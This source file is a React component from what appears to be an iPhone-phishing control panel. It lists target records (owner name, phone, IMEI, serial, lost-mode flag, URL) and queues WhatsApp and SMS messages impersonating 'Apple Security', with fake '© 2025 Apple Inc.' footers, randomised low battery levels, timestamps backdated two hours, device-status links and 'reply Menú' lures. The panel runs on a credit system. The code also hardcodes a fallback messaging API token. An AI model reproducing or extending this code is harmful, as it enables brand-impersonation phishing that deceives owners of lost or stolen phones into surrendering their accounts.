import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Input } from '@/components/ui/input';
import { toast } from '@/hooks/use-toast';
 import { Trash2, Send, RefreshCw, Edit, Image, ImageOff, MessageSquare, Search } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { getIphoneImageUrl } from '@/utils/iphoneImages';
import { generateRandomMessage } from '@/utils/messageVariations';
import EditProcessDialog from './EditProcessDialog';
 import SmsDialog from './SmsDialog';
 import WhatsAppDialog from './WhatsAppDialog';
import UltraMsgPreviewDialog from './UltraMsgPreviewDialog';
import ConfirmDialog from './ConfirmDialog';
import { englishSpeakingCountries } from '@/utils/countries';

interface Process {
  id: string;
  client_name: string;
  country_code: string;
  phone_number: string;
  contact_type: string;
  owner_name: string | null;
  iphone_model: string;
  storage: string;
  color: string;
  imei: string;
  serial_number: string;
  url: string | null;
  lost_mode?: boolean;
  status: string;
  created_at: string;
  updated_at: string;
  user_id: string;
  template_id?: string | null;
}

interface ProcessListProps {
  userType: 'admin' | 'user';
}

const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
  const [processes, setProcesses] = useState<Process[]>([]);
  const [loading, setLoading] = useState(true);
  const [sendingMessage, setSendingMessage] = useState<string | null>(null);
  const [userCredits, setUserCredits] = useState(0);
  const [editingProcess, setEditingProcess] = useState<Process | null>(null);
  const [isEditDialogOpen, setIsEditDialogOpen] = useState(false);
  const [imageStatus, setImageStatus] = useState<{ [key: string]: boolean }>({});
   const [smsProcess, setSmsProcess] = useState<Process | null>(null);
   const [isSmsDialogOpen, setIsSmsDialogOpen] = useState(false);
   const [whatsappProcess, setWhatsappProcess] = useState<Process | null>(null);
   const [isWhatsappDialogOpen, setIsWhatsappDialogOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [ultraMsgProcess, setUltraMsgProcess] = useState<Process | null>(null);
  const [ultraMsgLanguage, setUltraMsgLanguage] = useState<'spanish' | 'english'>('spanish');
  const [isUltraMsgDialogOpen, setIsUltraMsgDialogOpen] = useState(false);
  const [deleteConfirmId, setDeleteConfirmId] = useState<string | null>(null);

  // English-speaking country codes
  const englishCountryCodes = englishSpeakingCountries.map(c => c.code);

  const getLanguageFromCountryCode = (countryCode: string): 'spanish' | 'english' => {
    // Remove + if present for comparison
    const code = countryCode.startsWith('+') ? countryCode : `+${countryCode}`;
    return englishCountryCodes.includes(code) ? 'english' : 'spanish';
  };

  useEffect(() => {
    loadProcesses();
    loadUserCredits();
    
    const channel = supabase
      .channel('processes-changes')
      .on('postgres_changes', 
        { event: '*', schema: 'public', table: 'processes' },
        (payload) => {
          console.log('Process change detected:', payload);
          loadProcesses();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [userType]);

  useEffect(() => {
    if (processes.length > 0) {
      checkImageAvailability(processes);
      loadUserCredits(); // Reload credits when processes change
    }
  }, [processes]);

  const loadUserCredits = async () => {
    try {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) return;

      console.log('Loading credits for user:', session.user.id);
      
      const { data: profile, error } = await supabase
        .from('profiles')
        .select('credits')
        .eq('id', session.user.id)
        .maybeSingle();

      console.log('Credits query result:', { profile, error });

      if (error) {
        console.error('Error loading user credits:', error);
        return;
      }

      setUserCredits(profile?.credits || 0);
    } catch (error) {
      console.error('Error loading user credits:', error);
    }
  };

  const loadProcesses = async () => {
    try {
      setLoading(true);
      console.log('Loading processes for userType:', userType);
      
      const { data: { session } } = await supabase.auth.getSession();
      console.log('Current session:', session?.user?.email);

      if (!session) {
        console.log('No session found');
        setProcesses([]);
        return;
      }

      console.log('Loading processes for user:', session.user.id);
      const { data, error } = await supabase
        .from('processes')
        .select('*')
        .eq('user_id', session.user.id)
        .order('created_at', { ascending: false });
      
      console.log('Processes query result:', { data, error, userType });

      if (error) {
        console.error('Error loading processes:', error);
        throw error;
      }

      console.log('Processes loaded:', data?.length || 0);
      const processesWithDefaults = data?.map(process => ({
        ...process,
        lost_mode: Boolean((process as any).lost_mode),
        status: (process as any).status || 'nuevo'
      })) || [];
      
      setProcesses(processesWithDefaults);
    } catch (error: any) {
      console.error('Error loading processes:', error);
      toast({
        title: "Error",
        description: `Error al cargar procesos: ${error.message}`,
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const checkImageExists = async (url: string): Promise<boolean> => {
    try {
      const response = await fetch(url, { method: 'HEAD' });
      return response.ok;
    } catch (error) {
      console.log('Image check failed:', error);
      return false;
    }
  };

  const checkImageAvailability = async (processes: Process[]) => {
    const imageStatusMap: { [key: string]: boolean } = {};
    
    for (const process of processes) {
      const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
      const hasImage = await checkImageExists(imageUrl);
      imageStatusMap[process.id] = hasImage;
    }
    
    setImageStatus(imageStatusMap);
  };

  const deleteProcess = async (processId: string) => {
    setDeleteConfirmId(null);

    try {
      console.log('Deleting process:', processId);
      
      const { error } = await supabase
        .from('processes')
        .delete()
        .eq('id', processId);

      if (error) {
        console.error('Error deleting process:', error);
        throw error;
      }

      toast({
        title: "Proceso eliminado",
        description: "El proceso ha sido eliminado exitosamente",
      });

      await loadProcesses();
    } catch (error: any) {
      console.error('Error deleting process:', error);
      toast({
        title: "Error",
        description: error.message || "Error al eliminar proceso",
        variant: "destructive",
      });
    }
  };

  const handleEditProcess = (process: Process) => {
    setEditingProcess(process);
    setIsEditDialogOpen(true);
  };

  const handleCloseEditDialog = () => {
    setEditingProcess(null);
    setIsEditDialogOpen(false);
  };

   const handleOpenSmsDialog = (process: Process) => {
     setSmsProcess(process);
     setIsSmsDialogOpen(true);
   };

   const handleCloseSmsDialog = () => {
     setSmsProcess(null);
     setIsSmsDialogOpen(false);
   };

   const handleOpenWhatsappDialog = (process: Process) => {
     setWhatsappProcess(process);
     setIsWhatsappDialogOpen(true);
   };

   const handleCloseWhatsappDialog = () => {
     setWhatsappProcess(null);
     setIsWhatsappDialogOpen(false);
   };

  const handleProcessUpdated = () => {
    loadProcesses();
  };

  const handleSendViaWebJs = async (process: Process) => {
    try {
      setSendingMessage(process.id);
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error('No autenticado');

      const lang = getLanguageFromCountryCode(process.country_code);
      const { battery, delayedTime, formatDate, formatTime } = generateDynamicValues();
      const messageContent = generateRandomMessage(process, lang, battery, delayedTime, formatDate, formatTime);
      const fullPhone = `${process.country_code}${process.phone_number}`;
      const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
      const hasImage = imageStatus[process.id];

      const { data, error } = await supabase.functions.invoke('send-whatsapp-webjs', {
        body: {
          userId: user.id,
          phone: fullPhone,
          message: messageContent,
          imageUrl: hasImage ? imageUrl : null,
          language: lang,
        },
      });

      if (error) throw error;

      toast({
        title: data?.sent_via === 'whatsapp-webjs' ? '✅ Enviado via WA Web' : '📱 Enviado via UltraMsg (fallback)',
        description: `Mensaje enviado a ${process.client_name}`,
      });

      await loadProcesses();
    } catch (error: any) {
      console.error('WA Web send error:', error);
      toast({
        title: 'Error de envío',
        description: error.message || 'No se pudo enviar el mensaje',
        variant: 'destructive',
      });
    } finally {
      setSendingMessage(null);
    }
  };

  const sendWhatsAppMessage = async (process: Process, language: 'spanish' | 'english') => {
    try {
      if (userCredits <= 0) {
        toast({
          title: "Sin créditos suficientes",
          description: "No tienes créditos suficientes para enviar mensajes. Contacta al administrador.",
          variant: "destructive",
        });
        return;
      }

      setSendingMessage(process.id);
      console.log(`Adding message to queue for process: ${process.id} in ${language}`);

      const settingsKeys = language === 'spanish' 
        ? ['whatsapp_instance', 'whatsapp_token']
        : ['whatsapp_instance_en', 'whatsapp_token_en'];

      const { data: settings } = await supabase
        .from('system_settings')
        .select('*')
        .in('setting_key', settingsKeys);

      const config = settings?.reduce((acc: any, setting: any) => {
        acc[setting.setting_key] = setting.setting_value;
        return acc;
      }, {});

      const instanceId = language === 'spanish' 
        ? (config?.whatsapp_instance || 'instance126876')
        : (config?.whatsapp_instance_en || 'instance_en_default');
        
      const token = language === 'spanish' 
        ? (config?.whatsapp_token || '4ecj8581tubua7ry')
        : (config?.whatsapp_token_en || 'token_en_default');

      if (!instanceId || !token || instanceId.includes('default') || token.includes('default')) {
        toast({
          title: "Configuración faltante",
          description: `No hay configuración de WhatsApp para ${language === 'spanish' ? 'español' : 'inglés'}. Configúrala en Configuraciones.`,
          variant: "destructive",
        });
        return;
      }

      const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
      console.log('Generated iPhone image URL:', imageUrl);

      const imageExists = imageStatus[process.id] !== undefined ? imageStatus[process.id] : await checkImageExists(imageUrl);
      console.log('Image exists:', imageExists);

      const fullPhoneNumber = `${process.country_code}${process.phone_number}`;
      
      let messageContent: string;

      // Check if process has a custom template
      if (process.template_id) {
        const { data: template } = await supabase
          .from('message_templates')
          .select('template_content')
          .eq('id', process.template_id)
          .single();

        if (template) {
          // Replace variables in template
          const customSection = template.template_content
            .replace(/\{client_name\}/g, process.client_name || '')
            .replace(/\{phone_number\}/g, process.phone_number || '')
            .replace(/\{iphone_model\}/g, process.iphone_model || '')
            .replace(/\{storage\}/g, process.storage || '')
            .replace(/\{color\}/g, process.color || '')
            .replace(/\{imei\}/g, process.imei || '')
            .replace(/\{serial_number\}/g, process.serial_number || '')
            .replace(/\{owner_name\}/g, process.owner_name || '')
            .replace(/\{url\}/g, process.url || '');

          // Build complete message with random variations (like normal messages)
          const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
          const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
          
          const openings = [
            "🔐 Notificación de Seguridad de Apple",
            "🛡️ Alert de Seguridad Apple",
            "🔒 Sistema de Seguridad Apple",
            "⚡ Notificación Automática Apple",
            "🔔 Alerta de Dispositivo Apple"
          ];
          
          const messagePhrases = [
            "📌 Mensaje automático enviado como **aviso prioritario al número registrado**.",
            "🚨 Notificación automática dirigida a **tu contacto principal verificado**.",
            "📢 Alert generado automáticamente para **el teléfono asociado a tu cuenta**.",
            "⚠️ Comunicación automática enviada a **tu número de seguridad registrado**.",
            "📱 Mensaje del sistema enviado a **tu contacto de emergencia principal**."
          ];
          
          const deviceSections = [
            `👤 Propietario: ${process.owner_name || 'No especificado'}
📱 Modelo: ${process.iphone_model}
🎨 Color: ${process.color}
💾 Almacenamiento: ${process.storage}
📟 IMEI: ${process.imei}
🔑 Número de serie: ${process.serial_number}
🔋 Batería: ${battery}%`,
            
            `👤 Usuario: ${process.owner_name || 'No especificado'}
📱 Dispositivo: ${process.iphone_model}
🌈 Color: ${process.color}
💽 Capacidad: ${process.storage}
🔢 IMEI: ${process.imei}
🆔 Serie: ${process.serial_number}
⚡ Nivel batería: ${battery}%`,
            
            `👤 Titular: ${process.owner_name || 'No especificado'}
📱 iPhone: ${process.iphone_model}
🎨 Coloración: ${process.color}
💾 Memoria: ${process.storage}
📟 Código IMEI: ${process.imei}
🔑 No. Serie: ${process.serial_number}
🔋 Carga: ${battery}%`
          ];
          
          const helpPhrases = [
            "📬 ¿Eres el dueño? 👉 *Responde con* **Menú** para recibir ayuda inmediata del equipo de soporte técnico 👨🏽‍🔧",
            "💬 ¿Necesitas asistencia? 👉 *Escribe* **Menú** para contactar con nuestro soporte especializado 👨‍💻",
            "🆘 ¿Requieres ayuda? 👉 *Envía* **Menú** para obtener asistencia técnica inmediata 🔧",
            "📞 ¿Buscas soporte? 👉 *Responde* **Menú** para conectar con nuestro equipo técnico 👨‍🔧",
            "🛠️ ¿Necesitas apoyo? 👉 *Contesta* **Menú** para recibir asistencia profesional 👩‍💻"
          ];
          
          const closings = [
            "🛡️ Apple Security – Servicio activo 24/7\n©️ 2025 Apple Inc.",
            "🔒 Apple Security – Sistema operativo 24/7\n©️ 2025 Apple Inc.",
            "⚡ Apple Security – Monitoreo continuo\n©️ 2025 Apple Inc.",
            "🌐 Apple Security – Protección 24 horas\n©️ 2025 Apple Inc.",
            "🔐 Apple Security – Vigilancia permanente\n©️ 2025 Apple Inc."
          ];

          // Build complete message: opening + custom section + message phrase + device + url + help + closing
          messageContent = `${random(openings)}

${customSection}

${random(messagePhrases)}

${random(deviceSections)}

${process.url ? `🌍 Ver estado del dispositivo: ${process.url}` : ''}

${random(helpPhrases)}

${random(closings)}`;
        } else {
          // Fallback to random message if template not found
          const { battery, delayedTime, formatDate, formatTime } = generateDynamicValues();
          messageContent = generateRandomMessage(process, language, battery, delayedTime, formatDate, formatTime);
        }
      } else {
        // Use random message generation
        const { battery, delayedTime, formatDate, formatTime } = generateDynamicValues();
        messageContent = generateRandomMessage(process, language, battery, delayedTime, formatDate, formatTime);
      }

      // Get current user
      const { data: { user } } = await supabase.auth.getUser();
      
      if (!user) {
        throw new Error('Usuario no autenticado');
      }

      // Add message to queue instead of sending directly
      const { error: queueError } = await supabase
        .from('message_queue')
        .insert({
          user_id: user.id,
          process_id: process.id,
          message_content: messageContent,
          recipient_phone: fullPhoneNumber,
          language: language,
          image_url: imageExists ? imageUrl : null,
          template_id: process.template_id || null,
          status: 'pending'
        });

      if (queueError) {
        console.error('Error adding to queue:', queueError);
        const friendly = queueError.message?.includes('MAX_2_MESSAGES_PER_NUMBER')
          ? 'Límite alcanzado: solo puedes tener 2 mensajes pendientes para el mismo número.'
          : 'Error al agregar mensaje a la cola';
        toast({
          title: 'No se pudo agregar',
          description: friendly,
          variant: 'destructive',
        });
        return;
      }

      const { error: updateError } = await supabase
        .from('processes')
        .update({ 
          status: 'en cola',
          updated_at: new Date().toISOString()
        })
        .eq('id', process.id);

      if (updateError) {
        console.error('Error updating process status:', updateError);
      }

      // Notify admin that a new message was queued
      try {
        await supabase.functions.invoke('process-message-queue', {
          body: {
            notifyAdmin: true,
            messageId: null // Just notify, don't process yet
          }
        });
      } catch (notifyError) {
        console.error('Error notifying admin:', notifyError);
        // Don't fail the whole process if notification fails
      }

      const { battery } = generateDynamicValues();
      const messageType = imageExists ? 'con imagen' : 'solo texto (imagen no disponible)';
      const languageText = language === 'spanish' ? 'español' : 'inglés';
      const contactTypeText = process.contact_type === 'propietario' ? 'propietario' : 'contacto de emergencia';
      const templateText = process.template_id ? ' (usando plantilla personalizada)' : '';
      
      toast({
        title: "Mensaje agregado a la cola",
        description: `Mensaje ${messageType} en ${languageText} para ${process.client_name} (${contactTypeText})${templateText}. Se enviará automáticamente en 5 minutos. Batería: ${battery}%.`,
      });

      await loadProcesses();
    } catch (error: any) {
      console.error('Error sending WhatsApp message:', error);
      toast({
        title: "Error de envío",
        description: `${error.message}. No se han descontado créditos.`,
        variant: "destructive",
      });
    } finally {
      setSendingMessage(null);
    }
  };

  const generateDynamicValues = () => {
    // Batería aleatoria por debajo del 40%
    const battery = Math.floor(Math.random() * 35) + 5; // Entre 5% y 39%
    
    // Fecha/hora con 2 horas de retraso
    const now = new Date();
    const delayedTime = new Date(now.getTime() - 2 * 60 * 60 * 1000); // 2 horas atrás
    
    const formatDate = (date: Date, language: 'spanish' | 'english') => {
      if (language === 'spanish') {
        return date.toLocaleDateString('es-ES', { 
          day: '2-digit', 
          month: '2-digit', 
          year: 'numeric' 
        });
      } else {
        return date.toLocaleDateString('en-US', { 
          month: '2-digit', 
          day: '2-digit', 
          year: 'numeric' 
        });
      }
    };
    
    const formatTime = (date: Date) => {
      return date.toLocaleTimeString('es-ES', { 
        hour: '2-digit', 
        minute: '2-digit',
        hour12: false
      });
    };

    return {
      battery,
      delayedTime,
      formatDate,
      formatTime
    };
  };

  if (loading) {
    return (
      <Card className="glass-card">
        <CardContent className="p-8">
          <div className="flex items-center justify-center gap-3">
            <RefreshCw className="h-5 w-5 text-primary animate-spin" />
            <p className="text-muted-foreground">Cargando procesos...</p>
          </div>
        </CardContent>
      </Card>
    );
  }

  const filteredProcesses = processes.filter(p => {
    if (!searchQuery.trim()) return true;
    const q = searchQuery.toLowerCase();
    return (
      (p.client_name || '').toLowerCase().includes(q) ||
      (p.phone_number || '').toLowerCase().includes(q) ||
      (p.iphone_model || '').toLowerCase().includes(q) ||
      (p.imei || '').toLowerCase().includes(q) ||
      (p.serial_number || '').toLowerCase().includes(q) ||
      (p.owner_name || '').toLowerCase().includes(q) ||
      (p.status || '').toLowerCase().includes(q) ||
      (p.color || '').toLowerCase().includes(q)
    );
  });

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="glass-card glow-card rounded-xl p-5">
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
          <div>
            <h2 className="text-xl font-bold text-foreground font-['Space_Grotesk']">
              Mis Procesos
            </h2>
            <p className="text-xs text-muted-foreground mt-1">
              {filteredProcesses.length} proceso{filteredProcesses.length !== 1 ? 's' : ''}{searchQuery ? ` de ${processes.length}` : ''}
            </p>
          </div>
          <div className="flex items-center gap-3">
            <div className="gold-gradient text-primary-foreground px-4 py-2 rounded-lg font-semibold text-sm flex items-center gap-2">
              <span className="opacity-80">⚡</span>
              <span>{userCredits} créditos</span>
            </div>
            <Button
              onClick={loadProcesses}
              variant="outline"
              size="sm"
              className="border-primary/30 text-primary hover:bg-primary/10"
            >
              <RefreshCw className="h-4 w-4" />
            </Button>
          </div>
        </div>

        {/* Search */}
        <div className="relative mt-4">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <Input
            placeholder="Buscar por nombre, teléfono, modelo, IMEI, serie..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="pl-10 bg-secondary/50 border-border/40 focus:border-primary/50"
          />
        </div>
      </div>

      {filteredProcesses.length === 0 ? (
        <Card className="glass-card">
          <CardContent className="p-10">
            <div className="text-center">
              <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-4">
                <Search className="h-7 w-7 text-primary/50" />
              </div>
              <p className="text-foreground/70 mb-2 font-medium">{searchQuery ? 'Sin resultados' : 'Sin procesos'}</p>
              <p className="text-muted-foreground text-sm">
                {searchQuery ? 'Intenta con otro término de búsqueda.' : 'Los procesos que agregues aparecerán aquí.'}
              </p>
            </div>
          </CardContent>
        </Card>
      ) : (
        <div className="space-y-3">
          {filteredProcesses.map((process) => {
            const lang = getLanguageFromCountryCode(process.country_code);
            const statusColors: Record<string, string> = {
              'enviado': 'bg-success/20 text-success border-success/30',
              'en cola': 'bg-info/20 text-info border-info/30',
              'nuevo': 'bg-primary/20 text-primary border-primary/30',
              'error': 'bg-destructive/20 text-destructive border-destructive/30',
            };
            const statusClass = statusColors[process.status] || 'bg-secondary text-secondary-foreground border-border';

            return (
              <div
                key={process.id}
                className="glass-card glow-card rounded-xl overflow-hidden transition-all duration-300 hover:border-primary/25"
              >
                {/* Top row: name + status + actions */}
                <div className="p-4 pb-0">
                  <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-3">
                    {/* Left: identity */}
                    <div className="flex items-center gap-3 min-w-0 flex-1">
                      <div className="w-10 h-10 rounded-lg gold-gradient flex items-center justify-center shrink-0">
                        <span className="text-primary-foreground font-bold text-sm">
                          {process.client_name?.charAt(0)?.toUpperCase() || '?'}
                        </span>
                      </div>
                      <div className="min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <h3 className="font-semibold text-foreground truncate font-['Space_Grotesk']">
                            {process.client_name}
                          </h3>
                          <span className={`text-[10px] font-medium px-2 py-0.5 rounded-full border ${statusClass}`}>
                            {process.status}
                          </span>
                          {imageStatus[process.id] !== undefined && (
                            imageStatus[process.id] ? (
                              <span className="text-[10px] px-2 py-0.5 rounded-full bg-success/15 text-success border border-success/20 flex items-center gap-1">
                                <Image className="h-2.5 w-2.5" /> IMG
                              </span>
                            ) : (
                              <span className="text-[10px] px-2 py-0.5 rounded-full bg-warning/15 text-warning border border-warning/20 flex items-center gap-1">
                                <ImageOff className="h-2.5 w-2.5" /> S/IMG
                              </span>
                            )
                          )}
                          {process.lost_mode && (
                            <span className="text-[10px] px-2 py-0.5 rounded-full bg-destructive/15 text-destructive border border-destructive/20">
                              📱 Perdido
                            </span>
                          )}
                        </div>
                        <p className="text-xs text-muted-foreground mt-0.5">
                          {process.country_code} {process.phone_number} · {process.contact_type}
                          {process.owner_name && ` · ${process.owner_name}`}
                        </p>
                      </div>
                    </div>

                    {/* Right: action buttons */}
                    <div className="flex items-center gap-2 flex-wrap lg:flex-nowrap">
                      <Button
                        size="sm"
                        onClick={() => {
                          setUltraMsgProcess(process);
                          setUltraMsgLanguage(lang);
                          setIsUltraMsgDialogOpen(true);
                        }}
                        disabled={userCredits <= 0}
                        className="bg-primary/15 hover:bg-primary/25 text-primary border border-primary/20 h-8 text-xs gap-1.5"
                      >
                        <Send className="h-3.5 w-3.5" />
                        WA {lang === 'english' ? '🇺🇸' : '🇪🇸'}
                      </Button>
                      <Button
                        size="sm"
                        onClick={() => handleOpenSmsDialog(process)}
                        className="bg-info/15 hover:bg-info/25 text-info border border-info/20 h-8 text-xs gap-1.5"
                      >
                        <MessageSquare className="h-3.5 w-3.5" />
                        SMS
                      </Button>
                      <Button
                        size="sm"
                        onClick={() => handleOpenWhatsappDialog(process)}
                        className="bg-success/15 hover:bg-success/25 text-success border border-success/20 h-8 text-xs gap-1.5"
                      >
                        <MessageSquare className="h-3.5 w-3.5" />
                        WAPRO
                      </Button>
                      {userType === 'admin' && (
                        <Button
                          size="sm"
                          onClick={() => handleSendViaWebJs(process)}
                          disabled={sendingMessage === process.id}
                          className="bg-violet-500/15 hover:bg-violet-500/25 text-violet-400 border border-violet-500/20 h-8 text-xs gap-1.5"
                        >
                          <Send className="h-3.5 w-3.5" />
                          WA Web
                        </Button>
                      )}
                      <div className="flex gap-1.5 ml-1">
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={() => handleEditProcess(process)}
                          className="h-8 w-8 p-0 text-warning hover:bg-warning/10"
                        >
                          <Edit className="h-3.5 w-3.5" />
                        </Button>
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={() => setDeleteConfirmId(process.id)}
                          className="h-8 w-8 p-0 text-destructive hover:bg-destructive/10"
                        >
                          <Trash2 className="h-3.5 w-3.5" />
                        </Button>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Device details with image */}
                <div className="p-4 pt-3">
                  <div className="bg-secondary/30 rounded-lg p-3 flex gap-4">
                    {/* iPhone Image */}
                    <div className="shrink-0 hidden sm:flex items-center justify-center">
                      <div className="w-20 h-24 rounded-lg bg-secondary/50 border border-border/30 overflow-hidden flex items-center justify-center">
                        {imageStatus[process.id] ? (
                          <img
                            src={getIphoneImageUrl(process.iphone_model, process.color)}
                            alt={`${process.iphone_model} ${process.color}`}
                            className="w-full h-full object-contain p-1"
                            onError={(e) => {
                              (e.target as HTMLImageElement).style.display = 'none';
                              (e.target as HTMLImageElement).nextElementSibling?.classList.remove('hidden');
                            }}
                          />
                        ) : (
                          <div className="flex flex-col items-center gap-1 text-muted-foreground">
                            <span className="text-2xl">📱</span>
                            <span className="text-[8px] uppercase tracking-wider">No img</span>
                          </div>
                        )}
                      </div>
                    </div>
                    {/* Details grid */}
                    <div className="flex-1 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3 text-xs">
                      <div>
                        <p className="text-muted-foreground text-[10px] uppercase tracking-wider mb-0.5">Modelo</p>
                        <p className="text-foreground font-medium">{process.iphone_model}</p>
                      </div>
                      <div>
                        <p className="text-muted-foreground text-[10px] uppercase tracking-wider mb-0.5">Storage</p>
                        <p className="text-foreground font-medium">{process.storage}</p>
                      </div>
                      <div>
                        <p className="text-muted-foreground text-[10px] uppercase tracking-wider mb-0.5">Color</p>
                        <p className="text-foreground font-medium">{process.color}</p>
                      </div>
                      <div>
                        <p className="text-muted-foreground text-[10px] uppercase tracking-wider mb-0.5">IMEI</p>
                        <p className="text-foreground font-medium font-mono text-[11px]">{process.imei}</p>
                      </div>
                      <div>
                        <p className="text-muted-foreground text-[10px] uppercase tracking-wider mb-0.5">Serie</p>
                        <p className="text-foreground font-medium font-mono text-[11px]">{process.serial_number}</p>
                      </div>
                      <div>
                        <p className="text-muted-foreground text-[10px] uppercase tracking-wider mb-0.5">Creado</p>
                        <p className="text-foreground font-medium">{new Date(process.created_at).toLocaleDateString()}</p>
                      </div>
                    </div>
                  </div>
                  {process.url && (
                    <div className="mt-2 bg-secondary/20 rounded-lg px-3 py-2">
                      <p className="text-[10px] text-muted-foreground uppercase tracking-wider mb-0.5">URL</p>
                      <p className="text-primary text-xs break-all font-mono">{process.url}</p>
                    </div>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}

      <EditProcessDialog
        process={editingProcess}
        isOpen={isEditDialogOpen}
        onClose={handleCloseEditDialog}
        onProcessUpdated={handleProcessUpdated}
      />

       <SmsDialog
         isOpen={isSmsDialogOpen}
         onClose={handleCloseSmsDialog}
         process={smsProcess}
       />

       <WhatsAppDialog
         isOpen={isWhatsappDialogOpen}
         onClose={handleCloseWhatsappDialog}
         process={whatsappProcess}
       />

       <UltraMsgPreviewDialog
         isOpen={isUltraMsgDialogOpen}
         onClose={() => { setIsUltraMsgDialogOpen(false); setUltraMsgProcess(null); }}
         process={ultraMsgProcess}
         language={ultraMsgLanguage}
         onSent={loadProcesses}
       />

       <ConfirmDialog
         open={!!deleteConfirmId}
         onOpenChange={(open) => { if (!open) setDeleteConfirmId(null); }}
         onConfirm={() => deleteConfirmId && deleteProcess(deleteConfirmId)}
         title="Eliminar proceso"
         description="¿Estás seguro de que quieres eliminar este proceso? Esta acción no se puede deshacer."
         confirmText="Eliminar"
         cancelText="Cancelar"
         variant="danger"
       />
    </div>
  );
};

export default ProcessList;
